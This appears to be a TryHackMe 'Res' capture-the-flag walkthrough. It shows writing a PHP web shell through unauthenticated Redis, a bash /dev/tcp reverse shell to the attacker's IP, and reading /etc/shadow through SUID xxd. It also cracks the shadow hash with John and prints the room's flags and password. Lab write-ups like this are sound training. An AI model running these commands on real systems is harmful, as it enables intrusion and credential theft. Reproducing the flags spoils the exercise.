# Room: Res

## General Info
- **Room link:** [Res](https://tryhackme.com/room/res)

## Description

Hack into a vulnerable database server with an in-memory data-structure in this semi-guided challenge!

## Provided Files / Links
- [x] Target Machine IP (10.10.151.169)

## Enumeration / Recon
- Ports Enumeration

`nmap -sV 10.10.151.169 -p- -T5`

```
PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
6379/tcp open  redis   Redis key-value store 6.0.7
```
There is a redis service on port 6379.

I was able to connect on the service with `redis-cli -h 10.10.151.169 -p 6379`.

I will try to get unauthenticated Remote Code Execution now with the following:

```
config set dir /var/www/html
config set dbfilename shell.php
set payload "<?php system($_GET['cmd']); ?>"
save
```

I then create a listener (`nc -lnvp 1337`) and trigger the shell:

```
http://10.10.151.169/shell.php?cmd=id
http://10.10.151.169/shell.php?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/10.9.1.194/1337+0>%261'
```

An I am now in the target machine.

## Target machine exploitation

I first stabilize the shell with `python3 -c 'import pty; pty.spawn("/bin/sh")'`.

I am able to locate the user.txt flag in /home/vianka: **thm{red1s_rce_w1thout_credent1als}**.

I download linpeas.sh on the target machine (after creating a web server on my machine with `python3 -m http.server 33456`).

The most important thing is the following (I will exploit this permission later):

```
══════════════════════╣ Files with Interesting Permissions ╠══════════════════════
-rwsr-xr-x 1 root root 19K Mar 18  2020 /usr/bin/xxd
```

Then the following is something that I already knew when I connected to redis: 

```
Redis isn't password protected
-rw-rw-r-- 1 vianka vianka 84643 Sep  2  2020 /home/vianka/redis-stable/redis.conf
```

The groups permission will be useful later when we're logged as vianka (vianka is in the sudo group):

```
uid=1000(vianka) gid=1000(vianka) groups=1000(vianka),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),114(lpadmin),115(sambashare)
```

First, I will exploit the `xxd` vulnerability with GTFObins (https://gtfobins.github.io/gtfobins/xxd/). I can read the /etc/shadow file with these commands:

```
LFILE=/etc/shadow
/usr/bin/xxd "$LFILE" | xxd -r
```

I find vianka's hash:

```
vianka:$6$2p.tSTds$qWQfsXwXOAxGJUBuq2RFXqlKiql3jxlwEWZP6CWXm7kIbzR6WzlxHR.UHmi.hc1/TuUOUBo/jWQaQtGSXwvri0:18507:0:99999:7:::
```

Then I will try to crack the hash with John the Ripper.

I create a hash.txt file with the hash:

`echo '$6$2p.tSTds$qWQfsXwXOAxGJUBuq2RFXqlKiql3jxlwEWZP6CWXm7kIbzR6WzlxHR.UHmi.hc1/TuUOUBo/jWQaQtGSXwvri0' > hash.txt`

And run the command (it's a sha512crypt hash):

`john --format=sha512crypt --wordlist=/usr/share/wordlists/rockyou.txt hash.txt`

And I find the password **beautiful1**.

With vianka's password, I am able to switch user and since vianka is in the sudo group, I can now become root (`sudo su`).

I find the last flag in /root/root.txt: **thm{xxd_pr1v_escalat1on}**.